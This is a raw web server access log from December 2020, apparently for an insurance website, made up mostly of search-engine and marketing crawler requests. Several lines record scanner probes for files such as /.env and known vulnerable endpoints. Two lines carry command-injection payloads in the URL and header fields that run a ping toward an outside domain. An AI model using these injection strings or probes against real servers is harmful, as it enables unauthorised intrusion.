::ffff:209.17.96.130 - - [11/Dec/2020:00:03:44 +0000] "GET / HTTP/1.0" 200 62517 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [11/Dec/2020:00:22:32 +0000] "GET /web_assets/assets/img/green-img/medicare.png HTTP/1.1" 200 10322 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [11/Dec/2020:00:29:19 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:127.0.0.1 - - [11/Dec/2020:00:29:24 +0000] "GET /blog-details/26 HTTP/1.1" 200 32951 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [11/Dec/2020:01:00:53 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "(compatible;PetalBot;+https://aspiegel.com/petalbot)"
::ffff:127.0.0.1 - - [11/Dec/2020:01:12:35 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:127.0.0.1 - - [11/Dec/2020:01:24:49 +0000] "GET /seeyon/htmlofficeservlet HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [11/Dec/2020:01:26:25 +0000] "GET / HTTP/1.1" 200 62517 "";ping `echo aaaaaaaaaaa | base64`-inject3-swiftbullhead.com.01h4x.com;"" "";ping `echo aaaaaaaaaaa | base64`-inject2-swiftbullhead.com.01h4x.com;""
::ffff:127.0.0.1 - - [11/Dec/2020:01:26:27 +0000] "GET /%22;ping%20%60echo%20aaaaaaaaaaa%20%7C%20base64%60-inject-swiftbullhead.com.01h4x.com;%22 HTTP/1.1" 404 228 "";ping `echo aaaaaaaaaaa | base64`-inject3-swiftbullhead.com.01h4x.com;"" "";ping `echo aaaaaaaaaaa | base64`-inject2-swiftbullhead.com.01h4x.com;""
::ffff:127.0.0.1 - - [11/Dec/2020:01:27:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [11/Dec/2020:01:27:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [11/Dec/2020:02:00:05 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:00:39 +0000] "GET /carrier-info HTTP/1.1" 200 223630 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:09:03 +0000] "GET /wp-info.php HTTP/1.1" 404 150 "http://google.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
::ffff:127.0.0.1 - - [11/Dec/2020:02:09:41 +0000] "GET / HTTP/1.1" 200 62517 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:127.0.0.1 - - [11/Dec/2020:02:38:18 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:38:18 +0000] "GET /about-defy HTTP/1.1" 200 41416 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:39:28 +0000] "GET /get_travel_nsurance HTTP/1.1" 200 46589 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:41:06 +0000] "GET /resource/4 HTTP/1.1" 200 33794 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:45:05 +0000] "GET /resource/2 HTTP/1.1" 200 29877 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:47:33 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:47:33 +0000] "GET /resource/1 HTTP/1.1" 200 34152 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:47:37 +0000] "GET /resource/4 HTTP/1.1" 200 33794 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:47:41 +0000] "GET /get_home_nsurance HTTP/1.1" 200 48331 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:47:49 +0000] "GET /contact HTTP/1.1" 200 39599 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:49:17 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [11/Dec/2020:02:49:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [11/Dec/2020:02:49:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [11/Dec/2020:02:51:21 +0000] "GET /get_auto_nsurance HTTP/1.1" 200 49181 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:53:14 +0000] "GET /get_renter_nsurance HTTP/1.1" 200 46586 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:53:20 +0000] "GET /resource/2 HTTP/1.1" 200 29877 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:53:29 +0000] "GET /get_auto_nsurance HTTP/1.1" 200 49181 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:69.162.83.246 - - [11/Dec/2020:02:54:42 +0000] "GET http://example.com/ HTTP/1.1" 200 62517 "-" "Go-http-client/1.1"
::ffff:127.0.0.1 - - [11/Dec/2020:02:56:39 +0000] "GET /get_worker_comp_nsurance HTTP/1.1" 200 45765 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:57:45 +0000] "GET /get_life_nsurance HTTP/1.1" 200 46591 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:02:58:34 +0000] "GET /videos HTTP/1.1" 200 36476 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:01:12 +0000] "GET /about-defy HTTP/1.1" 200 41416 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:01:27 +0000] "GET /resource/5 HTTP/1.1" 200 33972 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:02:27 +0000] "GET /get_life_nsurance HTTP/1.1" 200 46591 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:03:04 +0000] "GET /doc.php HTTP/1.1" 404 146 "http://google.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
::ffff:127.0.0.1 - - [11/Dec/2020:03:04:31 +0000] "GET /get_renter_nsurance HTTP/1.1" 200 46586 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:05:33 +0000] "GET /resource/3 HTTP/1.1" 200 30976 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:05:48 +0000] "GET /contact HTTP/1.1" 200 39599 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
::ffff:127.0.0.1 - - [11/Dec/2020:03:08:46 +0000] "GET /resource/3 HTTP/1.1" 200 30976 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
